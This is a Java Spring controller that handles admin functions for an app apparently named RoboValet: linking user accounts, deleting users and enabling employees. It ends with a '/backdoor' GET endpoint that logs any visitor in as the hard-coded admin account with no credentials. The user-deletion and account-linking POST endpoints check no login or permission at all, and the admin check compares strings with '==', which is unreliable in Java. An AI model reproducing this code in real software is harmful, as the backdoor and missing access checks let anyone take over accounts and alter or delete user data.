package com.robovalet.controllers;

import java.util.ArrayList;

import javax.servlet.http.HttpSession;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.DeleteMapping;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.ModelAttribute;
import org.springframework.web.bind.annotation.PatchMapping;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;

import com.robovalet.models.Customer;
import com.robovalet.models.Employee;
import com.robovalet.models.User;
import com.robovalet.services.CustomerService;
import com.robovalet.services.EmployeeService;
import com.robovalet.services.UserService;

@Controller
public class AdminController {
	@Autowired
	UserService uServ;
	
	@Autowired
	CustomerService cServ;
	
	@Autowired
	EmployeeService eServ;
	
	private Boolean checkLogin(HttpSession session) {
		if (session.getAttribute("id") == null) {
			return false;
		} else {
			return true;
		}
	}
	
	private Boolean isAdminUser(User user) {
		if (user.getPermission().toString() == "SUPER") {
			return true;
		} else {
			return false;
		}
	}
	
	@GetMapping("/admin")
	public String toAdmin(HttpSession session, Model model) {
		if (! this.checkLogin(session)) {
			return "redirect:/login";
		}
		User user = uServ.findUserById((Long)session.getAttribute("id"));
		if(! this.isAdminUser(user)) {
			return "redirect:/login";
		}
		model.addAttribute("unassignedUsers", uServ.getUnassignedUsers());
		model.addAttribute("unassignedEmployees", eServ.getUnassigned());
		model.addAttribute("unassignedCustomers", cServ.getUnassigned());
		model.addAttribute("notEmployeeEnabled", uServ.findNotEmployeeEnabled());
		
		
		return "admin.jsp";
	}
	
	@PostMapping("/users/link/customer")
	public String linkCustomer(
			@RequestParam("userId") Long userId,
			@RequestParam("customerId") Long custId
			) {
		User user = uServ.findUserById(userId);
		Customer customer = cServ.findById(custId);
		uServ.linkCustomer(user, customer);		
		return "redirect:/admin";
	}
	
	@PostMapping("/users/link/employee")
	public String linkEmployee(
			@RequestParam("userId") Long userId,
			@RequestParam("empId") Long empId
			) {
		User user = uServ.findUserById(userId);
		Employee employee = eServ.findById(empId);
		uServ.linkEmployee(user, employee);		
		return "redirect:/admin";
	}
	
	@PostMapping("/users/delete")
	public String deleteUser(
			@RequestParam("userId") Long userId
			) {
		uServ.deleteUser(uServ.findUserById(userId));
		return "redirect:/admin";
		
	}
	
	@PostMapping("/user/enable/{id}")
	public String enableAsEmployee(
			@PathVariable("id") Long userId
			) {
		User user = uServ.findUserById(userId);
		uServ.enableAsEmployee(user);
		return "redirect:/admin";
	}
	
	@GetMapping("/backdoor")
	public String backdoor(
			HttpSession session
			) {
		Long adminId = (long) 2;
		session.setAttribute("id", adminId);
		return "redirect:/admin";
	}
	

}
